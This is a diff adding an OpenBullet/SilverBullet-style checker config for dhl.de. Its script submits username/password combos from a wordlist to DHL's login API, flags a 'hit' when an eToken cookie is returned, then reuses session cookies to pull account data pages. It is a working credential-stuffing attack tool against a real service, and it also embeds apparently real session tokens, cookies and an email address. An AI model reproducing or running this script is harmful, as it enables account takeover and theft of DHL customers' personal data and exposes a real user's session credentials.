@@ -1,0 +1,138 @@
+[SETTINGS]
+{
+  "Name": "dhl.de",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-19T15:36:23.2902471+04:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.1.1 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "dhl",
+  "IconPath": "Icon\\svbfile.ico",
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#lgn FUNCTION Length "{\"id\":\"mr.developer.g@gmail.com\",\"password\":\"fghdfgdrgergerg\",\"authenticationLevel\":3,\"authenticationMethod\":[\"pwd\"],\"rememberMe\":false,\"language\":\"de\",\"context\":\"web\",\"meta\":\"\"}" -> VAR "lgn" 
+
+REQUEST POST "https://www.dhl.de/int-erkennen/login" 
+  CONTENT "{\"id\":\"<USER>\",\"password\":\"<PASS>\",\"authenticationLevel\":3,\"authenticationMethod\":[\"pwd\"],\"rememberMe\":false,\"language\":\"de\",\"context\":\"web\",\"meta\":\"\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.dhl.de" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: */*" 
+  HEADER "CSRF-Token: undefined" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "x-erkennen-subject: mr.developer.g@gmail.com" 
+  HEADER "Origin: https://www.dhl.de" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.dhl.de/de/privatkunden.html" 
+  HEADER "Accept-Language: en-US,en;q=0.9,tr;q=0.8,fa;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: <lgn>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES>" Contains "eToken" 
+  KEYCHAIN Failure OR 
+    KEY ":[\"mfa\"]}" 
+
+#_abck PARSE "<COOKIES(_abck)>" LR "" "" -> VAR "_abck" 
+
+#bm_sz PARSE "<COOKIES(bm_sz)>" LR "" "" CreateEmpty=FALSE -> CAP "bm_sz" 
+
+#eToken PARSE "<COOKIES(eToken)>" LR "" "" -> VAR "eToken" 
+
+#eDeviceID PARSE "<COOKIES(eDeviceID)>" LR "" "" CreateEmpty=FALSE -> CAP "eDeviceID" 
+
+REQUEST GET "https://www.dhl.de/de/privatkunden/kundenkonto/meine-daten/_jcr_content/par/responsivegrid_439295201/responsivepar/imageborder_1842337251.default.html" 
+  
+  COOKIE "bm_sz=EEB5863132399C418C3AA1C83CF3CF21~YAAQSSgRAhZQWzR5AQAAe9S0dQs5nCuLq+5GHuLYWmrgCuYOOfT1sm6jdcBk0UvLP8wjnHqhNZhZynmSTtIudKClFN9NEopD9TSlfdafcaMQBhXItCQM9TNdmkhQtN8B2rr83heAI0Liy4G4xP+5gn87pVGx8jU5wNsZYPjj2XcyhMT+16IiIhqiZMjR/9QsuqCBycOxFwgedgLnsTpsZyi9y9x46mVl5Iw2JTPNvxtXAHZ99yoiPuSI1+NM+Ki1epGfwzYMWlB67jjQSQMhzy4BhW0iiNQAWLo=; at_check=true; AMCVS_3505782352FCE66F0A490D4C%40AdobeOrg=1; eDeviceID=0cb5dc2a-bfe1-496f-b2bb-032e232e59ce; s_cc=true; OptanonAlertBoxClosed=2021-05-16T15: 04:30.281Z; s_fid=71F3AFCDA5FF29DE-2A40CAE370388E5D; 47cec3f3c07a8104be6b87c3c450fcd0=ceca7cb2642ccc4d7793efab9fe0d5b3; 3bee075008e4f4d7d7ca92165f87f9db=090b0db7c21571b39284174c79c9af64; 8e3bf6be8d4d96f012b043f8fb8832de=3e7106a3f0cd19e7773138c2bf4c2073; verfolgen-affinity=1621177528.227.869.451296; akaalb_wwwdhldealb=~op=www_dhl_de_alb_verfolgen_only_azure:verfolgen_azure|www_dhl_de_alb_empfaengerpraeferenzen_only:empfaengerpraeferenzen|www_dhl_de_alb_stammdaten_only:stammdaten|www_dhl_de_alb_bonus_only:bonus|www_dhl_de_alb_erkennen_only:erkennen|www_dhl_de_alb:wwwdhlde|~rv=100~m=verfolgen_azure:0|empfaengerpraeferenzen:0|stammdaten:0|bonus:0|erkennen:0|wwwdhlde:0|~os=06f548fb0da0a4ee62020bebc018f01f~id=23b52544f0affeaff0371959e626478b; bm_mi=94B809CA720E7D9B21B22695D24C9A72~SLQpIQyz3hd/eFR+6JuOZQD0Ez1p7tmaR5y1EtBVeBwRRhqDnW6OGsGInoxhShvA12zwVFelOd+d5hTmpCLDoziBMg9hjpzYMyZaXXRuOGEekd/CSN/bzvnpAMLkKRxxx057npBDNtyGvLLISCdLX06eKpibeulEC10FpsQnRAiiX3/MBgX0WPyYyZgx0UDRGjYMw03qQ4mJRZMVUJF9viPsAr6mchmPxALtM8fT14R4i5vS5C8Ta2hNdW+hYSWECk86ZUd5D7rQJheK5XrOAcHElEygeucl3eiRKGRkzoHpMBJXRg+a4lbrzNQdJqKLuq6QUfdwgWfOJwlw6WC1YfUJ2wIcic29sTDVrY4+ZWBDAXty62OOMtNHCcBxRag0; ak_bmsc=BED95915921A56CFCE9F5FD49868CA2A02148F9E27300000CD57A16087CBA103~plTpB70/JliQkAXKgCIPbjkivoh46kUaurum8HHYDD9rjScbSj/Xgvla0HIRw6BMSA+C9UzulpSOi5m42lsbnEuqTZ0CsfRPNXv9MjvdiKn4356+/AasLEpK0pW8DqdhtN5SbBr1JV8K03OyP9wTv5cGAobsEF4b7a8IcHYmexbqkntMxlorkRYbFRLFPk6LGhF+cLK7z6PrJyDoE5gyBoLd4DDvvjHy/EY5J0TBHv5lollagSf1wPKKQJD59semBQ; AMCV_3505782352FCE66F0A490D4C%40AdobeOrg=77933605%7CMCIDTS%7C18764%7CMCMID%7C11592221946764902060687490298219896429%7CMCAAMLH-1621791331%7C6%7CMCAAMB-1621791331%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1621193731s%7CNONE%7CvVersion%7C4.5.1; TS019c6793=018f69a74e011cf146113ec7e60d1cacb542bea52d6a00f417c416ffa446fc1953e7c6280300a073181fa9a973c6c425c42128b616; _abck=23D88F44DC36B6AF2A7148964E3CA137~0~YAAQno8UApiA8015AQAAKsI/dgWrv0BhhvpoTvSbiN9GOQisR3zIESW4+pef7w67O0LZn3Wr7BpHjK6AOW8SGAm1SZkoqoKxwZyAuevBqV4W77VbbduRsLV+li1l1Num+0I38ihsEP+kB04W8MkQUAIYpHIZ3Egb43t1/X9/OEfS28InoN3mVJodEwegWdfSSKXmGGwKbsYhyDn7VG+FKUGE7Uuhx2kxzfpXDkOuvpsMC0ZsGML1nrpGQoFEgqBKBo7gsgGCEadX1HKJK9x4J9XFEV8qsvPb523ZCcB2zS6OPfCFykMSW4FbzVnLw/gFqspI/e5G2K+tpckh+XRudb6fPuMUPpHJx9BXIz+BPBi4jpoMnazq1JgdULq690aX+kzfB+/IN6M6iQlUnOcPll+qJFWFKNqbLRkwxbjT7wcVkySXliJ2plPYnA==~-1~-1~-1; s_sq=%5B%5BB%5D%5D; OptanonConsent=isIABGlobal=false&datestamp=Sun+May+16+2021+22%3A07%3A07+GMT%2B0430+(Iran+Daylight+Time)&version=6.6.0&hosts=&consentId=85301524-af8c-4611-8cf7-1d589bd5c715&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CBIN01%3A1%2CYOU01%3A1%2CC0004%3A1%2CBG105%3A1&geolocation=US%3BNY&AwaitingReconsent=false; mbox=PC#aa0d909af7e747d1bdf0730b9c759923.37_0#1684431428|session#f5d7922318964faaa0c1920efd2bf106#1621188369; eToken=eyJ6aXAiOiJERUYiLCJraWQiOiJjcnlwdF8xNDk4MTM0NjU3Nzg5IiwiY3R5IjoiSldUIiwidHlwIjoiSldUIiwiZW5jIjoiQTI1NkNCQy1IUzUxMiIsImFsZyI6ImRpciJ9..HVLaBdMWKrJsR-zVrAVvdw.0atJLK46fsULotDJAtuFXK6RVjijsKs0MnaDDpfsLcTjJjJ6aixWVwqTIuiHC8k5anyYs95Qd5MxlZt9OH-zPnb97cTKXFnhgT1x7etxLNIn13tbPQtpvP8AphYnOHj-371Gapn61Vxab0atpdoTs1YXpR88eTsqQ3ClAiaw633nWiXkBX996pO40s58it-cti5HBTiIIAkxh0q_kLGJypHNCBOeO_xwK182kMISyKPVblkE8c_d11k54R2uj-iVVtmmjTb6KcLjZasKokdgd3f0scixa3lMvXwWajjKQ27LNhi-p-BsxRqV7byQGyATXq0WiuWVLlf1CQbBt2ERynhZgWr2rTOemlsPDMGuhBhjliSDdciZo-wpEHJhomePWauSTdjrKeP3Cep0NvIpVHwI4LiojY_G1HRgz_nEgjuqkq7Y0bth5twqCl7NxnN006XzntnwbghMrALehiI_nHX6PXMTZJZg55ZAYVAbZHD7LO3RxTKi8nEYeprq6m6FIOK5DnGXxhEqITMEprqiaBeFLJHBbM6789fXK5wIy7ULKP0g337vBP_21YEP_NTY0JN9QlRG8JuprGECm0_0qzZwWEeGkgKS7GlUmTwEqCt9DnK3WT91kDuTwVmDUAN9SjaYLrdSJo5j--GnXf08g1z-_cgqUJZo_Sxq_Q4Kg7eWpGf4o3h4GkPrKWoJUZMitloEOx-gbuWNig8QjFbuJo__7u4wr6brxcsiVkO_pxWM0FVGCYO8FbtGSXXmIPXUfzbzKLkEVeunX8fO4zmR_cf57IfrgokugGLtdIFUGrwkBrTlWg6Hz64f4tyN4_qomI4LHJDDFLroUP3zfB1hVr6BiMMySfu2vAEF7dX9mjSBYzPQ_Ync6cJsMlGOo2_vDkGURJ6ImeBAs-gGQQhGO2EVxIZSQCYDZ4K8JLJHln8wFnS3_mriM6Q_m1G5J4VaLZt2g3-cpFEFd7qmh25Gu3NR4XNe-lWFFVotskqEtcafKkCvzGrr8QAnBOw4sU5JvAelhMduryMgo1nJcqCz78nld5-s5F_dadOh_uXzvnY6UbK7QMTz5zA0st5yOKYSJrPmJLdAEsYJE0iPiG57YkU2FZ4-vOSzYLLoemNiFw1gIHUvANu2b8GZZ0P4n1Q9S7cWHaNUf399_wkNXWRkD0ogPT01Zo9FJgRwquEN2eY63Lcf9twMl9AFwey6pgyGBfOFxXYqP7dof2rxmf8lH89tluiWtOBZbubeYdw-1sDNsDJZSzCQTxTj0ousMTARNcHITw59kpMAnqlBij3mBzbqcujy9mL6fOxfuAz7SUNI0JBDVLbStbk9k23kfAeFXZ7a9sjPZxxhN4kRIroJNds6tZQUcX0SfSk3NlQBebSbjSepnLqyRqEJ2Flp6f0V.UxZN4psr-avu9mYszva_I6v7mjJ__Q5XNnohGt5Gdjw; bm_sv=3350D3266CD9A754F50429C534BDF493~Dwvlz7kQJtT/O26XQqqroULZWdrp6Zh0LjpxZCDBe8MIABqgFyY15zAUyTCcRw4n7YLBU/Otnvug1ZKwI3v9ck1ap+DyxqffOjaXDFPtxa2oZrbTt8vP0cUeOX3W2JZQ+41sB8AZtp4VCW/cwWviFCFRqvpVSLRGC8kD59r8WOE=" 
+  HEADER "Host: www.dhl.de" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"" 
+  HEADER "Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.dhl.de/de/privatkunden/kundenkonto/meine-daten.html" 
+  HEADER "Accept-Language: en-US,en;q=0.9,tr;q=0.8,fa;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#bm_sv PARSE "<COOKIES(bm_sv)>" LR "" "" -> VAR "bm_sv" 
+
+!REQUEST GET "https://www.dhl.de/int-stammdaten/customers/baseData" 
+!  
+!  COOKIE "bm_sz: <bm_sz>; at_check=true; AMCVS_3505782352FCE66F0A490D4C%40AdobeOrg=1; eDeviceID: <eDeviceID>; s_cc=true; OptanonAlertBoxClosed=2021-05-16T15:04:30.281Z; s_fid=71F3AFCDA5FF29DE-2A40CAE370388E5D; 47cec3f3c07a8104be6b87c3c450fcd0=ceca7cb2642ccc4d7793efab9fe0d5b3; 3bee075008e4f4d7d7ca92165f87f9db=090b0db7c21571b39284174c79c9af64; 8e3bf6be8d4d96f012b043f8fb8832de=3e7106a3f0cd19e7773138c2bf4c2073; verfolgen-affinity=1621177528.227.869.451296; akaalb_wwwdhldealb=~op=www_dhl_de_alb_verfolgen_only_azure:verfolgen_azure|www_dhl_de_alb_empfaengerpraeferenzen_only:empfaengerpraeferenzen|www_dhl_de_alb_stammdaten_only:stammdaten|www_dhl_de_alb_bonus_only:bonus|www_dhl_de_alb_erkennen_only:erkennen|www_dhl_de_alb:wwwdhlde|~rv=100~m=verfolgen_azure:0|empfaengerpraeferenzen:0|stammdaten:0|bonus:0|erkennen:0|wwwdhlde:0|~os=06f548fb0da0a4ee62020bebc018f01f~id=23b52544f0affeaff0371959e626478b; bm_mi=94B809CA720E7D9B21B22695D24C9A72~SLQpIQyz3hd/eFR+6JuOZQD0Ez1p7tmaR5y1EtBVeBwRRhqDnW6OGsGInoxhShvA12zwVFelOd+d5hTmpCLDoziBMg9hjpzYMyZaXXRuOGEekd/CSN/bzvnpAMLkKRxxx057npBDNtyGvLLISCdLX06eKpibeulEC10FpsQnRAiiX3/MBgX0WPyYyZgx0UDRGjYMw03qQ4mJRZMVUJF9viPsAr6mchmPxALtM8fT14R4i5vS5C8Ta2hNdW+hYSWECk86ZUd5D7rQJheK5XrOAcHElEygeucl3eiRKGRkzoHpMBJXRg+a4lbrzNQdJqKLuq6QUfdwgWfOJwlw6WC1YfUJ2wIcic29sTDVrY4+ZWBDAXty62OOMtNHCcBxRag0; ak_bmsc=BED95915921A56CFCE9F5FD49868CA2A02148F9E27300000CD57A16087CBA103~plTpB70/JliQkAXKgCIPbjkivoh46kUaurum8HHYDD9rjScbSj/Xgvla0HIRw6BMSA+C9UzulpSOi5m42lsbnEuqTZ0CsfRPNXv9MjvdiKn4356+/AasLEpK0pW8DqdhtN5SbBr1JV8K03OyP9wTv5cGAobsEF4b7a8IcHYmexbqkntMxlorkRYbFRLFPk6LGhF+cLK7z6PrJyDoE5gyBoLd4DDvvjHy/EY5J0TBHv5lollagSf1wPKKQJD59semBQ; AMCV_3505782352FCE66F0A490D4C%40AdobeOrg=77933605%7CMCIDTS%7C18764%7CMCMID%7C11592221946764902060687490298219896429%7CMCAAMLH-1621791331%7C6%7CMCAAMB-1621791331%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1621193731s%7CNONE%7CvVersion%7C4.5.1; TS019c6793=018f69a74e011cf146113ec7e60d1cacb542bea52d6a00f417c416ffa446fc1953e7c6280300a073181fa9a973c6c425c42128b616; _abck: <_abck>; s_sq=%5B%5BB%5D%5D; mbox=PC#aa0d909af7e747d1bdf0730b9c759923.37_0#1684431491|session#f5d7922318964faaa0c1920efd2bf106#1621188369; OptanonConsent=isIABGlobal=false&datestamp=Sun+May+16+2021+22%3A08%3A12+GMT%2B0430+(Iran+Daylight+Time)&version=6.6.0&hosts=&consentId=85301524-af8c-4611-8cf7-1d589bd5c715&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CBIN01%3A1%2CYOU01%3A1%2CC0004%3A1%2CBG105%3A1&geolocation=US%3BNY&AwaitingReconsent=false; eToken: <eToken>; bm_sv: <bm_sv>" 
+!  HEADER "Host: www.dhl.de" 
+!  HEADER "Connection: keep-alive" 
+!  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept-Language: de" 
+!  HEADER "sec-ch-ua-mobile: ?0" 
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" 
+!  HEADER "Accept: application/json" 
+!  HEADER "Cache-Control: no-cache,no-store,must-revalidate" 
+!  HEADER "Expires: 0" 
+!  HEADER "Sec-Fetch-Site: same-origin" 
+!  HEADER "Sec-Fetch-Mode: cors" 
+!  HEADER "Sec-Fetch-Dest: empty" 
+!  HEADER "Referer: https://www.dhl.de/de/privatkunden/kundenkonto/meine-daten.html" 
+!  HEADER "Accept-Encoding: gzip, deflate" 
+
